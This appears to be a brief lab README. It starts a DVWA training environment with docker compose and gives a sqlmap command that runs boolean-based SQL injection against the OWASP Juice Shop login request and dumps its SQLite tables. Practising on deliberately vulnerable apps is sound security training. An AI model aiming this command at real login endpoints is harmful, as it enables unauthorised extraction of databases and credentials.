## To initiate the environment, run the following command:
``` bash
docker compose -f dvwa_compose.yml up -d
```

## To crack the juice shop, run the following command:
``` bash
python3 sqlmap-dev/sqlmap.py -r juice_shop_login_query.txt --ignore-code=401 --level=5 --risk=3 --technique=B --dbms=sqlite --dump --tables --threads 5;
```